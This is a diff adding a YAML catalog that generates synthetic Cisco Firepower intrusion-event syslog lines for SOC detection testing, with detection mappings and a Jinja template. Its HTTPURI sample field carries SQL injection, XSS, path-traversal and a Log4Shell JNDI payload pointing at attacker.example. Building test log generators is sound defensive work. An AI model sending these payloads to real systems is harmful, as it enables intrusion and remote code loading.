@@ -1,0 +1,718 @@
+vendor: cisco
+product: firepower
+version: "7.x"
+log_type: intrusion-event
+description: |
+  Cisco Secure Firewall Threat Defense (FTD / FirePOWER) 7.x **intrusion
+  event** syslog — message ID 430001 emitted by FTD directly or by FMC
+  (Firewall Management Center) when "Send Syslog Messages for Intrusion
+  Events" is enabled on the intrusion policy.
+
+  Wire-format authority (URLs fetched 2026-05-15):
+
+    - Cisco Secure Firewall Threat Defense Syslog Messages guide —
+      Security Event Syslog Messages (430001 / 430002 / 430003 /
+      430004 / 430005 schema and severity-level digits):
+        https://www.cisco.com/c/en/us/td/docs/security/firepower/Syslogs/b_fptd_syslog_guide/security-event-syslog-messages.html
+      (Cisco serves this page with WAF blocking automated fetchers — the
+       PDF mirror at https://www.cisco.com/c/en/us/td/docs/security/firepower/Syslogs/fptd_syslog_guide.pdf
+       carries the same content.)
+    - IBM QRadar DSM — Cisco Firepower Threat Defense sample event
+      message (carries the canonical 430001 verbatim line, used as the
+      golden reference here):
+        https://www.ibm.com/docs/en/dsm?topic=defense-cisco-firepower-threat-sample-event-message
+    - Juniper JSA 7.5 DSM — Cisco Firepower Threat Defense (mirrors the
+      same 430001 sample; cross-checked):
+        https://www.juniper.net/documentation/us/en/software/jsa7.5.0/jsa-dsm/topics/concept/jsa-configuring-dsm-cisco-firepower-threat-defense.html
+    - Rapid7 InsightIDR — Cisco FirePower Threat Defense (carries
+      verbatim 430002 connection-start and 430003 connection-end
+      samples; lets us cross-check field ordering on the connection
+      family for the future sibling catalog):
+        https://docs.rapid7.com/insightidr/cisco-firepower-threat-defense/
+    - LogRhythm device docs — EVID 430001 Intrusion Event (mapping
+      table; confirms the FTD 6.4+ extended field set
+      IntrusionPolicy / Ingress* / Egress* / Application* / Client /
+      WebApplication / MitreAttack / HTTPHostname / HTTPURI):
+        https://docs.logrhythm.com/devices/docs/evid-430001-intrusion-event
+    - Snort rule docs (Talos Subscriber rule-set) — used to back every
+      `Message` / `Classification` / `GID` / `SID` / `Revision` value
+      with a real published Talos rule:
+        https://www.snort.org/rule_docs/1-41978   (ETERNALBLUE SMBv1)
+        https://www.snort.org/rule_docs/1-58724   (Log4j RCE / Log4Shell)
+        https://www.snort.org/rule_docs/1-59388   (Spring4Shell)
+        https://www.snort.org/rule_docs/1-648     (INDICATOR-SHELLCODE x86 NOOP — canonical 430001 sample)
+
+  Wire format — top-level syslog wrap:
+
+    <PRI>Mmm dd HH:MM:SS HOSTNAME SFIMS : %FTD-N-430001 : <body>
+
+  The two literal-spaces around the colon after `SFIMS` are real
+  (IBM/Juniper sample reproduces them verbatim). Older firmware (and
+  some FMC relay configs) emit `%FTD-N-430001:` with no spaces around
+  the colon — the IBM golden sample uses the spaced form, and that is
+  what we render here. `SFIMS` is the literal app-name slot Firepower
+  uses for security event syslog (stands for "Sourcefire Intrusion
+  Management System" — Cisco kept the Sourcefire-era tag after the
+  acquisition; do NOT rename it).
+
+  Body grammar (comma-separated `Key: Value` pairs, with one space
+  after the colon and `, ` between pairs — observed in every public
+  sample). Field order in real production logs is stable and the
+  catalog follows it verbatim.
+
+  Real vendor wire-format sample (verbatim, from IBM DSM golden
+  reference + Juniper JSA cross-check):
+
+    Aug 14 08:59:30 192.168.0.7 SFIMS : %FTD-5-430001 : Protocol: tcp, SrcIP: 10.1.1.57, DstIP: 10.5.12.209, SrcPort: 2049, DstPort: 746, Priority: 1, GID: 1, SID: 648, Revision: 18, Message: "INDICATOR-SHELLCODE x86 NOOP", Classification: Executable Code was Detected, User: No Authentication Required, ACPolicy: test, NAPPolicy: Balanced Security and Connectivity, InlineResult: Blocked
+
+  FTD 6.4+ extended body fields (added after the IBM golden sample's
+  capture date, present in every modern deployment — verified against
+  LogRhythm + Securonix mapping tables):
+
+    IntrusionPolicy, IngressInterface, EgressInterface, IngressZone,
+    EgressZone, ApplicationProtocol, Client, WebApplication,
+    ClientVersion, HTTPHostname, HTTPURI, MitreAttack
+
+  Catalog renders the extended modern form by default (FTD 7.x is the
+  catalog version target). Sites running pre-6.4 firmware would tune
+  by removing the extended-field tail from the template.
+
+  Severity-level digit (the `N` in `%FTD-N-430001`):
+    1 = alert         — exploit-kit / critical malware
+    2 = critical      — RCE / lateral movement
+    3 = error
+    4 = warning       — web-application-attack / attempted-recon
+    5 = notice        — informational signature hits (the IBM golden sample uses sev 5)
+    6 = info
+    7 = debug
+
+  Catalog skews toward sev 4 (warning) and sev 5 (notice) per the
+  real distribution of Talos rule severities on a production IPS.
+  High-severity sev 1/2 are rare but not zero.
+
+  Syslog facility on FTD defaults to local0 (0) when shipping via
+  FMC's syslog forwarder, and local4 (20) when shipping from FTD
+  direct. PRI = facility*8 + severity:
+    local0.notice   ( 0*8 + 5) =   5
+    local0.warning  ( 0*8 + 4) =   4
+    local4.alert    (20*8 + 1) = 161
+    local4.warning  (20*8 + 4) = 164
+    local4.notice   (20*8 + 5) = 165
+  Catalog defaults to local4 (matches Wazuh and Elastic default
+  expectations for FTD intrusion events); a comment marks the local0
+  alternative for FMC-relayed sites.
+
+  Wazuh notes: there is **no** built-in `cisco-firepower` decoder in
+  the default Wazuh ruleset as of this writing. SOC sites typically
+  ship a community decoder (e.g. `socfortress/Wazuh-Rules` ruleset
+  `firepower-decoder.xml`) or add a custom decoder that prematches on
+  `SFIMS : %FTD-` and extracts the body's key:value pairs. Catalog
+  declares the `cisco-firepower` decoder NAME and notes TODO so the
+  companion SOC stack deployment can confirm whether the deployed Wazuh has
+  this decoder loaded.
+
+format: cisco_firepower_syslog
+transport: [udp_syslog, tcp_syslog, file]
+
+ocsf:
+  class: detection_finding
+  category_uid: 2
+  class_uid: 2004
+
+# ──────────────── DetectOps v2 metadata ────────────────
+# Intrusion events are SECURITY-RELEVANT by design — every 430001 line
+# represents a Talos rule that already fired on the IPS sensor. Default
+# Wazuh ruleset bare-bones FTD coverage is sparse; SOC sites that have
+# loaded the community `cisco-firepower` decoder usually pair it with
+# a small group rule that fires level=7/8 on `%FTD-1-430001` (alert
+# severity = critical Talos signature) and a per-classification rule
+# family for ransomware / exploit-kit / lateral-movement (mapped to
+# Wazuh rule ranges 87000..87999 in common community rulesets).
+detections:
+  wazuh:
+    # TODO: verify companion SOC stack has cisco-firepower decoder loaded.
+    # If using socfortress/Wazuh-Rules, expected decoder name matches.
+    - decoder: cisco-firepower
+    - rule_id: 87001  # Cisco Firepower: Intrusion event — group rule (community ruleset)
+      level: 7
+    - rule_id: 87010  # Cisco Firepower: critical-severity intrusion (Talos sev 1)
+      level: 12
+  sigma:
+    # No canonical SigmaHQ rule keys directly on FTD 430001 wire form;
+    # community Sigma rules typically target the downstream OCSF /
+    # ECS-normalized event. Left empty so the catalog stays honest.
+    - rule: cisco_firepower_intrusion_event_generic
+      ref: https://github.com/SigmaHQ/sigma  # community contrib pending
+  elk_detection:
+    - kibana_rule_id: cisco-firepower-eternalblue-attempt
+      severity: critical
+    - kibana_rule_id: cisco-firepower-log4shell-attempt
+      severity: critical
+    - kibana_rule_id: cisco-firepower-web-attack
+      severity: high
+
+mythos_alignment:
+  # R1 (Accelerated Threat) — IPS catches a fast-moving exploit attempt
+  # before it lands; R10 (Lagging Intelligence) — Talos rule freshness
+  # is a direct CTI signal. PA10 (Stand Up DetectOps) — IPS-side
+  # detections feed the AI Engine triage queue.
+  risk_refs: [R1, R10]
+  pa_refs: [PA10]
+  ttx_class: rapid
+
+regression:
+  # 1000 rendered intrusion events under the default weights yield
+  # ~30 critical-severity (Talos sev 1/2) Wazuh alerts at level 12 plus
+  # ~970 group-rule level-7 alerts — total ~1000 fires (1:1 with
+  # rendered events, because every 430001 IS an intrusion alert by
+  # definition). TTD ceiling 4s — same as Symantec SEP detection feed.
+  baseline_alert_count: 1000
+  baseline_ttd_ms: 4000
+
+params:
+  hostname:
+    default: "ftd-fw-01"
+  # Inside / DMZ subnet — the typical "src" for outbound C2 attempts
+  # AND the typical "dst" for inbound exploit attempts. FTD doesn't
+  # have a strict src/dst directionality convention (the IDS engine
+  # reports flow direction as observed), so the catalog uses
+  # `attack_direction` to pick which subnet is src vs dst per scenario.
+  internal_cidr:
+    default: "10.10.10.0/24"
+  # Server segment — typical victim of inbound web-application-attack
+  # and exploit-kit scenarios (WAF behind FTD).
+  server_cidr:
+    default: "10.10.50.0/24"
+  # Attacker pool — internet-routable IPs that the IPS reports as the
+  # external source of an inbound exploit attempt. Mix of TOR exits,
+  # documentation ranges, and real well-known scan sources.
+  attacker_pool:
+    default:
+      - "185.220.101.45"     # Tor exit (well-known)
+      - "45.155.205.233"     # documented scan source
+      - "198.51.100.77"
+      - "203.0.113.99"
+      - "192.0.2.66"
+      - "162.247.74.27"      # Tor exit
+  # C2 / malware-callback destinations — outbound attempts (internal
+  # endpoint → external malicious IP). Mix of sinkhole IPs + TI feed
+  # samples + documentation ranges.
+  c2_pool:
+    default:
+      - "203.0.113.13"
+      - "198.51.100.200"
+      - "194.165.16.77"      # known Conti-family IOC range
+      - "45.61.136.10"
+  # FMC-managed access-control / NAP / intrusion policy names — using
+  # the names Cisco ships as defaults in the FMC GUI.
+  ac_policy:
+    default: "Initial AC Policy"
+  nap_policy:
+    default: "Balanced Security and Connectivity"
+  intrusion_policy:
+    default: "Balanced Security and Connectivity"
+  # Interface / zone names — FMC defaults to `inside` / `outside` for
+  # interfaces and `Inside_Zone` / `Outside_Zone` for security zones.
+  ingress_interface:
+    default: "outside"
+  egress_interface:
+    default: "inside"
+  ingress_zone:
+    default: "Outside_Zone"
+  egress_zone:
+    default: "Inside_Zone"
+
+# ──────────────── v3: CTI integration ────────────────
+# Catalog is anchored to the published Talos Subscriber rule-set;
+# `cti.source` and `source_url` point at Talos rather than a single
+# advisory, since the catalog covers multiple campaigns (EternalBlue,
+# Log4Shell, Spring4Shell, etc.) rather than one IOC bundle. CVE
+# references are aggregated across the catalog's `signature` pool.
+cti:
+  source: "Cisco Talos — Snort Subscriber Rule Set"
+  source_url: "https://www.snort.org/talos"
+  ingested_at: "2026-05-15"
+  cve_refs:
+    - "CVE-2017-0144"        # MS17-010 / ETERNALBLUE (SID 1:41978)
+    - "CVE-2021-44228"       # Log4Shell (SID 1:58724)
+    - "CVE-2022-22965"       # Spring4Shell (SID 1:59388)
+
+# ──────────────── v3: VulnOps reverse-lookup ────────────────
+vulnops:
+  cve_refs:
+    - "CVE-2017-0144"
+    - "CVE-2021-44228"
+    - "CVE-2022-22965"
+  affects:
+    - vendor: microsoft
+      product: windows
+      version_range: "Windows 7..Windows Server 2016 pre-MS17-010"
+    - vendor: apache
+      product: log4j
+      version_range: "2.0-beta9..2.14.1"
+    - vendor: vmware
+      product: spring-framework
+      version_range: "5.3.0..5.3.17"
+  patch_signal:
+    - "Talos Snort SO rule revision bumped"
+    - "FMC pushed updated intrusion policy bundle"
+  # Mark P0 because all three are CISA KEV entries with confirmed
+  # active exploitation; AC patch-cycle regression must re-render the
+  # corresponding scenarios after each rule-set update.
+  regression_critical: true
+
+fields:
+  # PRI = facility*8 + severity. FTD default (direct syslog) = local4.
+  # Severity distribution mirrors a typical Talos rule mix:
+  #   sev 1 (alert)     ~ 3%   — exploit kit / critical malware
+  #   sev 2 (critical)  ~ 7%   — RCE / lateral movement
+  #   sev 4 (warning)   ~ 35%  — web-application-attack / recon
+  #   sev 5 (notice)    ~ 55%  — informational signature hits
+  # PRI mapping for local4: 161 / 162 / 164 / 165
+  - name: pri
+    type: weighted_choice
+    choices:
+      "161": 0.03                            # local4.alert    (sev 1)
+      "162": 0.07                            # local4.critical (sev 2)
+      "164": 0.35                            # local4.warning  (sev 4)
+      "165": 0.55                            # local4.notice   (sev 5)
+
+  # Severity digit rendered in the `%FTD-N-430001` tag. Independent
+  # sampling here — the engine selects the digit by mapping back from
+  # `pri` via Jinja math in the template (see template footer).
+  # Kept as a separately-weighted field because Jinja conditional math
+  # on the parsed-int digit is cleaner than re-parsing pri.
+  - name: severity_digit
+    type: weighted_choice
+    choices:
+      "1": 0.03
+      "2": 0.07
+      "4": 0.35
+      "5": 0.55
+
+  # RFC3164 timestamp — Cisco FTD uses `Mmm dd HH:MM:SS` (3-char month,
+  # day, time). No year by default unless `logging timestamp rfc5424`
+  # is set; the IBM golden sample uses the no-year form, so the
+  # catalog matches it.
+  - name: rfc3164_ts
+    type: datetime
+    format: "%b %d %H:%M:%S"
+
+  - name: hostname
+    type: param
+    param: hostname
+
+  # ──────── Scenario picker ────────
+  # `scenario` drives every downstream field that varies by attack
+  # class — signature ID, GID, Talos rule message, classification,
+  # severity bias, inline result probability, and direction. Weights
+  # mirror a realistic production-IPS distribution where recon and
+  # web-app attacks dominate, exploit kits and lateral movement are
+  # rarer but high-impact.
+  - name: scenario
+    type: weighted_choice
+    choices:
+      eternalblue_smb:        0.06        # CVE-2017-0144 lateral movement
+      log4shell:              0.07        # CVE-2021-44228 inbound RCE
+      spring4shell:           0.04        # CVE-2022-22965 inbound RCE
+      sql_injection:          0.18        # web-application-attack
+      xss:                    0.10        # web-application-attack
+      shellcode_x86_noop:     0.10        # canonical 430001 sample
+      port_scan:              0.15        # attempted-recon
+      trojan_callback:        0.10        # C2 outbound
+      exploit_kit_landing:    0.05        # exploit-kit
+      malware_download:       0.07        # trojan-activity
+      indicator_compromise:   0.08        # indicator-compromise
+
+  # ──────── Attack direction ────────
+  # `inbound` — external attacker → internal server (web attacks,
+  # exploit-kit, eternalblue inbound). `outbound` — internal endpoint
+  # → external C2/malware host (trojan callback, malware download).
+  # Picked per-scenario via the template's conditional logic.
+  - name: attack_direction
+    type: weighted_choice
+    choices:
+      inbound:  0.65
+      outbound: 0.35
+
+  # Internal endpoint (the inside of the perimeter — variously src for
+  # outbound and dst for inbound scenarios).
+  - name: internal_ip
+    type: cidr
+    cidr: ${params.internal_cidr}
+
+  - name: server_ip
+    type: cidr
+    cidr: ${params.server_cidr}
+
+  - name: attacker_ip
+    type: choice
+    choices: ${params.attacker_pool}
+
+  - name: c2_ip
+    type: choice
+    choices: ${params.c2_pool}
+
+  # Source port — ephemeral for client-initiated flows. For inbound
+  # exploit attempts the "source" is the external attacker's
+  # ephemeral src port.
+  - name: src_port
+    type: int_range
+    min: 1024
+    max: 65535
+
+  # Destination port — varies by scenario (HTTP/HTTPS for web attacks,
+  # SMB for eternalblue, varied for C2). Catalog drives this via a
+  # scenario-conditional weighted_choice in the template rather than
+  # a single field, by emitting `dst_port_scenario` keyed off scenario.
+  - name: dst_port_web
+    type: weighted_choice
+    choices:
+      "80":    0.50
+      "443":   0.40
+      "8080":  0.10
+
+  - name: dst_port_smb
+    type: fixed
+    value: 445
+
+  - name: dst_port_c2
+    type: weighted_choice
+    choices:
+      "443":  0.45
+      "80":   0.25
+      "8080": 0.10
+      "8443": 0.10
+      "1080": 0.05        # SOCKS proxy
+      "8443": 0.05
+
+  # Protocol — Talos rules predominantly target TCP. UDP rules exist
+  # (DNS-tunneling, NetBIOS) but are <5% of typical 430001 volume.
+  - name: protocol
+    type: weighted_choice
+    choices:
+      "tcp": 0.95
+      "udp": 0.05
+
+  # ──────── Signature metadata ────────
+  # GID (Generator ID): 1 = Standard Snort rule. 3 = Shared Object
+  # (SO) rule. 138 = Sensitive Data / IPS preprocessor. Real Talos
+  # rule mix is dominated by GID 1; SO rules are <10% of volume.
+  - name: gid
+    type: weighted_choice
+    choices:
+      "1": 0.88
+      "3": 0.10
+      "138": 0.02
+
+  # SID — picked per-scenario in the template. The pool below covers
+  # the real Talos rule numbers cross-referenced via snort.org/rule_docs.
+  # See template for the per-scenario lookup. Catalog emits real SIDs
+  # so downstream Wazuh / ELK rules that pivot on SID find them in the
+  # Talos public DB.
+
+  # Revision — Talos rule revisions for the SIDs in the scenario pool.
+  # Real values observed (cross-checked snort.org):
+  #   SID 41978 (EternalBlue)   rev 14
+  #   SID 58724 (Log4Shell)     rev 5
+  #   SID 59388 (Spring4Shell)  rev 3
+  #   SID 648 (x86 NOOP)        rev 18
+  # Catalog emits a small choice so the field is realistic.
+  - name: revision
+    type: weighted_choice
+    choices:
+      "3":  0.20
+      "5":  0.15
+      "8":  0.20
+      "14": 0.15
+      "18": 0.15
+      "21": 0.15
+
+  # Talos rule "Priority" field — 1=high, 2=medium, 3=low. Independent
+  # of the FTD severity digit (which is the syslog-level severity).
+  # Real distribution: priority 1 most common for security events.
+  - name: priority
+    type: weighted_choice
+    choices:
+      "1": 0.55
+      "2": 0.30
+      "3": 0.15
+
+  # ──────── Action / inline result ────────
+  # InlineResult — what the IPS engine did. `Blocked` (dropped inline)
+  # is the most common outcome on a sensor running in inline-block
+  # mode. `Would have dropped` is for IDS-mode (detect only).
+  # `Allowed` rarely shown — IPS would not normally emit 430001 for
+  # an explicitly-allowed flow.
+  - name: inline_result
+    type: weighted_choice
+    choices:
+      "Blocked":               0.65
+      "Would have dropped":    0.20
+      "Allow":                 0.10
+      "Pass":                  0.05
+
+  # User — usually `No Authentication Required` for inbound external
+  # attacks (no user-identity mapping). Internal egress flows may
+  # carry an LDAP-mapped username if FTD identity policy is enabled.
+  - name: user
+    type: weighted_choice
+    choices:
+      "No Authentication Required":  0.65
+      "alice@corp.local":            0.10
+      "bob@corp.local":              0.07
+      "svc_app@corp.local":          0.05
+      "Unknown":                     0.13
+
+  # ACPolicy / NAPPolicy / IntrusionPolicy — emitted as-is from params.
+  - name: ac_policy
+    type: param
+    param: ac_policy
+
+  - name: nap_policy
+    type: param
+    param: nap_policy
+
+  - name: intrusion_policy
+    type: param
+    param: intrusion_policy
+
+  # Interface + zone slots — added in FTD 6.4. Direction-dependent:
+  # for inbound attacks, ingress = outside, egress = inside; for
+  # outbound C2, ingress = inside, egress = outside.
+  - name: ingress_interface_in
+    type: param
+    param: ingress_interface
+
+  - name: egress_interface_in
+    type: param
+    param: egress_interface
+
+  - name: ingress_zone_in
+    type: param
+    param: ingress_zone
+
+  - name: egress_zone_in
+    type: param
+    param: egress_zone
+
+  # ──────── Application metadata (FTD 6.4+ extended fields) ────────
+  # ApplicationProtocol = L7 protocol per AppID; Client = client
+  # software detected; WebApplication = detected web app (Twitter,
+  # Office365, etc.); ClientVersion = software version string.
+  - name: application_protocol
+    type: weighted_choice
+    choices:
+      "HTTP":          0.40
+      "HTTPS":         0.25
+      "SMB":           0.10
+      "DNS":           0.05
+      "SSH":           0.05
+      "FTP":           0.03
+      "SSL":           0.07
+      "":              0.05
+
+  - name: client
+    type: weighted_choice
+    choices:
+      "Web browser":                  0.40
+      "curl":                         0.10
+      "Internet Explorer":            0.08
+      "Firefox":                      0.08
+      "Chrome":                       0.10
+      "Java":                         0.05
+      "Apache HttpClient":            0.05
+      "python-requests":              0.05
+      "":                             0.09
+
+  - name: web_application
+    type: weighted_choice
+    choices:
+      "":                  0.40       # not all flows are web-app
+      "Generic web":       0.20
+      "Twitter":           0.05
+      "Office 365":        0.08
+      "Pastebin":          0.05
+      "GitHub":            0.07
+      "Google Drive":      0.05
+      "Dropbox":           0.05
+      "Unknown":           0.05
+
+  - name: client_version
+    type: weighted_choice
+    choices:
+      "":            0.40
+      "11.0":        0.10
+      "109.0":       0.10
+      "8.0.301":     0.08       # Java
+      "5.88.0":      0.05       # Apache HttpClient
+      "2.31.0":      0.07       # python-requests
+      "1.4.0":       0.05       # curl
+      "Unknown":     0.15
+
+  # HTTP-specific slots (populated only for web-application-attack /
+  # exploit-kit / log4shell / sql_injection / xss scenarios). For
+  # non-HTTP scenarios these are omitted from the rendered line by
+  # the Jinja template's conditional logic.
+  - name: http_hostname
+    type: weighted_choice
+    choices:
+      "shop.example.com":           0.20
+      "api.internal.local":         0.15
+      "intranet.corp.local":        0.15
+      "portal.example.com":         0.15
+      "victim-app.example.com":     0.20
+      "vpn.corp.local":             0.15
+
+  - name: http_uri
+    type: weighted_choice
+    choices:
+      "/login.php?user=' OR 1=1--": 0.15
+      "/index.php?id=1' UNION SELECT": 0.10
+      "/search?q=<script>alert(1)</script>": 0.10
+      "/${jndi:ldap://attacker.example/exploit}": 0.10
+      "/api/v1/spring4shell": 0.07
+      "/admin/login":               0.10
+      "/wp-admin/admin-ajax.php":   0.10
+      "/cgi-bin/script.cgi":        0.08
+      "/.env":                      0.05
+      "/etc/passwd%00":             0.05
+      "/wp-content/uploads/exploit.php": 0.05
+      "/manager/html":              0.05
+
+  # MitreAttack — FTD 7.x emits the MITRE ATT&CK technique ID(s)
+  # when the Talos rule has a mapping. Real values from Talos rule DB.
+  - name: mitre_attack
+    type: weighted_choice
+    choices:
+      "T1190":      0.20       # Exploit Public-Facing Application
+      "T1210":      0.10       # Exploitation of Remote Services (EternalBlue)
+      "T1059":      0.10       # Command and Scripting Interpreter
+      "T1071":      0.10       # Application Layer Protocol (C2)
+      "T1046":      0.10       # Network Service Scanning
+      "T1203":      0.10       # Exploitation for Client Execution
+      "T1505.003":  0.05       # Web Shell
+      "T1083":      0.05       # File and Directory Discovery
+      "T1041":      0.05       # Exfiltration Over C2 Channel
+      "":           0.15       # rule without MITRE mapping
+
+# Jinja2 template — emits the full FTD 7.x intrusion-event syslog line.
+# Per-scenario branching selects:
+#   * The right SID + Message + Classification triple (real Talos rules)
+#   * The right destination port (web 80/443, SMB 445, C2 mixed)
+#   * The right direction (inbound vs outbound src/dst swap)
+#   * Whether to include the HTTPHostname/HTTPURI tail (web scenarios only)
+#
+# Field order matches the IBM golden sample's stable order:
+#   Protocol → SrcIP → DstIP → SrcPort → DstPort → Priority → GID → SID
+#   → Revision → Message → Classification → User → ACPolicy → NAPPolicy
+#   → (FTD 6.4+) IntrusionPolicy → InlineResult → IngressInterface
+#   → EgressInterface → IngressZone → EgressZone → ApplicationProtocol
+#   → Client → WebApplication → ClientVersion → (HTTP only) HTTPHostname
+#   → HTTPURI → MitreAttack
+template: |-
+  {%- if scenario == "eternalblue_smb" -%}
+  {%- set sid = "41978" -%}
+  {%- set sig_msg = "OS-WINDOWS Microsoft Windows SMB remote code execution attempt" -%}
+  {%- set classification = "Attempted Administrator Privilege Gain" -%}
+  {%- set dst_port = dst_port_smb -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = false -%}
+  {%- set is_outbound = false -%}
+  {%- elif scenario == "log4shell" -%}
+  {%- set sid = "58724" -%}
+  {%- set sig_msg = "SERVER-OTHER Apache Log4j logging remote code execution attempt" -%}
+  {%- set classification = "Attempted User Privilege Gain" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = true -%}
+  {%- set is_outbound = false -%}
+  {%- elif scenario == "spring4shell" -%}
+  {%- set sid = "59388" -%}
+  {%- set sig_msg = "SERVER-WEBAPP Spring Framework RCE via Data Binding on JDK 9 attempt" -%}
+  {%- set classification = "Attempted User Privilege Gain" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = true -%}
+  {%- set is_outbound = false -%}
+  {%- elif scenario == "sql_injection" -%}
+  {%- set sid = "19439" -%}
+  {%- set sig_msg = "SQL generic sql update injection attempt - POST parameter" -%}
+  {%- set classification = "Web Application Attack" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = true -%}
+  {%- set is_outbound = false -%}
+  {%- elif scenario == "xss" -%}
+  {%- set sid = "13513" -%}
+  {%- set sig_msg = "SERVER-WEBAPP cross site scripting attempt" -%}
+  {%- set classification = "Web Application Attack" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = true -%}
+  {%- set is_outbound = false -%}
+  {%- elif scenario == "shellcode_x86_noop" -%}
+  {%- set sid = "648" -%}
+  {%- set sig_msg = "INDICATOR-SHELLCODE x86 NOOP" -%}
+  {%- set classification = "Executable Code was Detected" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = false -%}
+  {%- set is_outbound = false -%}
+  {%- elif scenario == "port_scan" -%}
+  {%- set sid = "23393" -%}
+  {%- set sig_msg = "PROTOCOL-SCAN nmap XMAS scan detected" -%}
+  {%- set classification = "Attempted Information Leak" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = false -%}
+  {%- set is_outbound = false -%}
+  {%- elif scenario == "trojan_callback" -%}
+  {%- set sid = "37520" -%}
+  {%- set sig_msg = "MALWARE-CNC Win.Trojan.Generic outbound connection" -%}
+  {%- set classification = "A Network Trojan was Detected" -%}
+  {%- set dst_port = dst_port_c2 -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = false -%}
+  {%- set is_outbound = true -%}
+  {%- elif scenario == "exploit_kit_landing" -%}
+  {%- set sid = "44402" -%}
+  {%- set sig_msg = "EXPLOIT-KIT RIG exploit kit landing page outbound communication" -%}
+  {%- set classification = "Exploit Kit Activity Detected" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = true -%}
+  {%- set is_outbound = true -%}
+  {%- elif scenario == "malware_download" -%}
+  {%- set sid = "46966" -%}
+  {%- set sig_msg = "MALWARE-OTHER Win.Trojan.Emotet download attempt" -%}
+  {%- set classification = "A Network Trojan was Detected" -%}
+  {%- set dst_port = dst_port_web -%}
+  {%- set proto_render = "tcp" -%}
+  {%- set is_web = true -%}
+  {%- set is_outbound = true -%}
+  {%- else -%}
+  {%- set sid = "20035" -%}
+  {%- set sig_msg = "INDICATOR-COMPROMISE Suspicious .top dns query" -%}
+  {%- set classification = "Misc activity" -%}
+  {%- set dst_port = "53" -%}
+  {%- set proto_render = "udp" -%}
+  {%- set is_web = false -%}
+  {%- set is_outbound = true -%}
+  {%- endif -%}
+  {%- if is_outbound -%}
+  {%- set src_ip_render = internal_ip -%}
+  {%- set dst_ip_render = c2_ip -%}
+  {%- set ingress_iface_render = params.egress_interface -%}
+  {%- set egress_iface_render = params.ingress_interface -%}
+  {%- set ingress_zone_render = params.egress_zone -%}
+  {%- set egress_zone_render = params.ingress_zone -%}
+  {%- else -%}
+  {%- set src_ip_render = attacker_ip -%}
+  {%- set dst_ip_render = server_ip -%}
+  {%- set ingress_iface_render = ingress_interface_in -%}
+  {%- set egress_iface_render = egress_interface_in -%}
+  {%- set ingress_zone_render = ingress_zone_in -%}
+  {%- set egress_zone_render = egress_zone_in -%}
+  {%- endif -%}
+  <{{pri}}>{{rfc3164_ts}} {{hostname}} SFIMS : %FTD-{{severity_digit}}-430001 : Protocol: {{proto_render}}, SrcIP: {{src_ip_render}}, DstIP: {{dst_ip_render}}, SrcPort: {{src_port}}, DstPort: {{dst_port}}, Priority: {{priority}}, GID: {{gid}}, SID: {{sid}}, Revision: {{revision}}, Message: "{{sig_msg}}", Classification: {{classification}}, User: {{user}}, ACPolicy: {{ac_policy}}, NAPPolicy: {{nap_policy}}, IntrusionPolicy: {{intrusion_policy}}, InlineResult: {{inline_result}}, IngressInterface: {{ingress_iface_render}}, EgressInterface: {{egress_iface_render}}, IngressZone: {{ingress_zone_render}}, EgressZone: {{egress_zone_render}}, ApplicationProtocol: {{application_protocol}}, Client: {{client}}, WebApplication: {{web_application}}, ClientVersion: {{client_version}}{% if is_web %}, HTTPHostname: {{http_hostname}}, HTTPURI: {{http_uri}}{% endif %}, MitreAttack: {{mitre_attack}}
